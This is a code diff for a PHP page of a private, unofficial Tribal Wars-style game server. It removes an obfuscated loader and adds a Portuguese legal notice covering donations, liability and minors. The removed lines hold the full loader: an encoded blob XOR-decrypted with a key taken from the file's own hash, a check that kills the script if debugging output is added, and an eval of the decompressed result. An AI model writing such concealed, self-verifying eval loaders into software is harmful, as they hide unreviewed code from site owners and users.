@@ -1,24 +1,56 @@
 <?php
-$auahvoj="98e1fc71551460cefeaaa0d6f0b67785";
-$orfkatt="0e5951035f0251555756015557095103075003000753500f5055015205560d06";
-$iitgabn="T7upZPAPfSNy3sNKe00iQ2ciKdNjIJYRTupjX2B9Egoz4OWuEPP7kC7sSwB5RHKoWNJEhQa7tLePnVkboE78mNmApKatKm5ntPMF1N1DncwnErfdjG/b59vt2IaG/S9o/5tJz65wSQ1E1ijrJjLX/EbtblpBgPpRiFJ9+S7qglyIuUWrHEu7xNA3mDFtDSnYNMXWksNbLbaw1Y4QdNhvu3sq07yC+E9Z990PUKqXQphWeKW8769KoG92qZhivUxNyLjJ9XbvoqC6/9zAuZSkpHiYEBCBgtfCOROU63ZExm+i0neDTs48emvOeouucP+Af9Ph5iE+8C3O6YWf0bIp4uM1UX9Y2HcDdzqpeurVxKGohXheFf2wGo01myHWRUsFBELePftFDUXnzJ8dsX9mMEzNeddJp2CseI3zPdu094u2GbeNXb53X2um6gao2D9UMLkHkv8rc9WdUcFUTELHKJxH3PI2s9w6+SAVzC04H2eYIfM+7/4nMpUmio95yhGh/C0leKx/YccD1jGrclDZra2md072D2SnvRwGFnAUxcXjUWxNqrokDIbfBYQNRRTYVyYvUFNlXGxVmL0U/iumpDIhEwNS/UUekc3IRync7GMlayoMSlrVlBq490gCE5dxMc8xFUHEs2HVaUYTvAFGhAIUcsxL4KKgOGsLFMjKccBieK/ygVfxOg58w7ArOdkzT8SU21WDgQmXyG75DzpSI6z4vnX0BbcwNr8jRD3rIKlFjVmR/zBfmGV+eVj9MRuxRLR9D0FiK2uXdhPgPXVh34JtY5zDRhhkSqlw3himdhxS4n6ubmHaAMQ7o2bVTHMDz609NdL20fMk0j+C3eNX74BLdzZtfW8IODC0Si0nVwJkh2FZUs6bC/P8WQNiPa5HtNgg3bu1uo5UE1H5dhLT/uhg0fRMQHwsFio8ONGKjAYnfHECduDVwq6gyXdc9pLH43EVLKhNNkD1HIJ77Oj0LkfKG2MxHrHOr0MlNOOjO4oLFnw5Fzmi3zNdjqC5A8fmd5GYWrILk2lUdxBgwrQkduvUsyIvaeALcCsiDpK0tql2pThTyGfuQnNW/nTp2XSqDAk8yySaAU2ZrOItfC/VqkTfsnmSLyIDYBo+s5ShHKZ96BIxIFSdWLBk4HZWfR+KVdZe1wwrw9pI4NQNkBWxzV6jClxZ84FoFEhNv2Bgrt9x9yMg5dbhD1tnjTtn9EKJCq+YB6QU85Th9DUHVOGAkl3pMrrYSu//pRhrD/2vWi+h9ys5R4y+EBhKsf/H5pk3klAn0k9KoF27Wz6xnwW/vqkmfHm0JuSeZKoGj7C0jZOsH6r4K87la3Jxo254iXxv21WGdd2tuIx69/sZQgeGu4Km5QLRrHeqGdfO9aZl7JahZAqhGc+AsbAMOexDWGJbuS/eURlDNGqJ7sWdSnTqwT7M3liRDV0f0BM4E4Twr0ALoSAl/sL3za+Qnt+VtQmh6O5WKmoAnHjPZyLTO54hZzs/hlZmckjtgNU1FK9sMj6RLF2UHiSaFBUCeEuP+Zf30YlHRRki38xdW6bbwpWnsymDR5ABDV1D6vgi9zE9eBQ8xIGu6FD5Jv1WP16PkU6BRilc/sGg3OGzb+eX75CCsshmddZBQfgEtjo8SlHulmp7CRORBumBaB11VgLAYZyQz5unFUx8/DM2pR2gwsgklzqvS4YfYlgkDjSX6fCKnjZehYSHV1B8oIzduJVkTTfOWyW9PNGjRHLcvR58f7YOtSEJA0EUTEBaoLHAhn8COAgklJgT58EwZrjPAkYcejtQ1C+EP3TXMIFXby4IJVMl6biJOA5MIfImlXljY4h+URk9jYA4Yk8tg6kjDGNChVY8tapWk/HORds+g0pPCfKFoyTIomlCyjwp1iFqTfaHBbOLV//D/t1nLrIeFuuNqTm9Fn2LNT5m/hKX/IclWi2dFo+J7R2+2INOJkbu4grMzPGJVOzcupSWeKucdYFn1tyMHaqa012d084JoZQiSRU9U6hGJ5RP5vWedb3aAQU=";
-$rrbskvjyw=file_get_contents(__FILE__);
-$gzbpaoq=str_replace($iitgabn,"",$rrbskvjyw);
-if(strpos($gzbpaoq,"ec"."ho")!==false||strpos($gzbpaoq,"pr"."int")!==false||strpos($gzbpaoq,"var_"."dump")!==false||strpos($gzbpaoq,"file_put_"."contents")!==false||strpos($gzbpaoq,"fw"."rite")!==false){die();}
-$hwjbkdisqfo=str_replace(array($auahvoj,$orfkatt),array("SP_99012d0c","KP_55569066"),$rrbskvjyw);
-$bfjhugzmiw=md5($hwjbkdisqfo);
-$ivhlid=hex2bin($orfkatt);
-$kmvqwoon="";
-$ejfgahjet=strlen($bfjhugzmiw);
-for($twkozz=0;$twkozz<$ejfgahjet;$twkozz++){
-$kmvqwoon.=chr(ord($ivhlid[$twkozz])^ord($bfjhugzmiw[$twkozz]));
-}
-$xbqvthn=base64_decode($iitgabn);
-$smxlwikbei=strlen($xbqvthn);
-$wuwryouhmlt="";
-$qnrhsvnyi=strlen($kmvqwoon);
-for($twkozz=0;$twkozz<$smxlwikbei;$twkozz++){
-$wuwryouhmlt.=$xbqvthn[$twkozz]^$kmvqwoon[$twkozz%$qnrhsvnyi];
-}
-$gxhmjxzlt="gzun"."compress";
-eval('?>' . $gxhmjxzlt($wuwryouhmlt) . '<?php ');
+/**
+ * Informação Legal / Aviso Legal
+ */
+?>
+<h2><?= __('screens.premium.legal_info') ?></h2>
+
+<div class="content-box" style="background: #F4E4BC; border: 1px solid #8B4513; padding: 20px; line-height: 1.8;">
+
+    <h3>Identificação do Operador</h3>
+    <p>Este servidor de jogo é operado a título privado e sem fins lucrativos. Trata-se de um servidor não oficial
+        baseado no motor de jogo Tribal Wars, operado para fins recreativos de forma voluntária e comunitária.</p>
+
+    <h3>Carácter Gratuito e Modelo de Doações</h3>
+    <p><strong>O Noble Wars é um serviço completamente gratuito.</strong> Quaisquer valores transferidos pelos
+        utilizadores ao Operador têm o carácter exclusivo de <strong>doações voluntárias</strong>, sem contrapartida de
+        bens ou serviços. O Operador não é um comerciante, nem exerce atividade comercial.</p>
+    <p>Os pontos premium atribuídos a doadores são uma expressão de gratidão, não constituindo produto vendido nem
+        direito adquirido. O Operador reserva-se o direito de modificar os benefícios associados a doações a qualquer
+        momento e sem obrigação de compensação.</p>
+
+    <h3>Propriedade Intelectual</h3>
+    <p>O nome "Noble Wars" e todos os elementos gráficos e de jogo originais são propriedade da InnoGames GmbH. Este
+        servidor é mantido independentemente e não é afiliado, patrocinado ou aprovado pela InnoGames GmbH.</p>
+
+    <h3>Limitação de Responsabilidade</h3>
+    <p>O serviço é prestado "tal como está", sem garantias de disponibilidade contínua ou de ausência de erros. O
+        Operador não se responsabiliza por:</p>
+    <ul style="padding-left: 20px;">
+        <li>Interrupções temporárias do serviço para manutenção ou por razões técnicas</li>
+        <li>Perda de dados de jogo em caso de falha técnica grave</li>
+        <li>Danos indiretos ou consequenciais decorrentes do uso do serviço</li>
+    </ul>
+
+    <h3>Conteúdo de Terceiros</h3>
+    <p>Este serviço pode conter hiperligações para sítios web de terceiros. O Operador não se responsabiliza pelo
+        conteúdo desses sites nem pelas práticas de privacidade dos mesmos.</p>
+
+    <h3>Disputas e Reclamações</h3>
+    <p>Para questões, reclamações ou disputas, contacte-nos através da secção de <a
+            href="game.php?village=<?= $village['id'] ?>&screen=support">Suporte</a>. Comprometemo-nos a responder no
+        prazo de 5 dias úteis.</p>
+
+    <h3>Menores de Idade</h3>
+    <p>O registo neste servidor está disponível a utilizadores com 13 anos ou mais. Utilizadores com menos de 18 anos
+        devem ter o consentimento dos seus responsáveis legais para realizar compras de pontos premium.</p>
+
+    <h3>Alterações ao Aviso Legal</h3>
+    <p>Este aviso pode ser atualizado periodicamente. A data da última atualização é indicada abaixo.</p>
+
+    <p style="margin-top: 20px; font-size: 12px; color: #666;">Última atualização: Março de 2026</p>
+</div>
+
+<p style="margin-top: 15px;">
+    <a href="game.php?village=<?= $village['id'] ?>&screen=premium" class="btn">← Voltar ao Premium</a>
+</p>
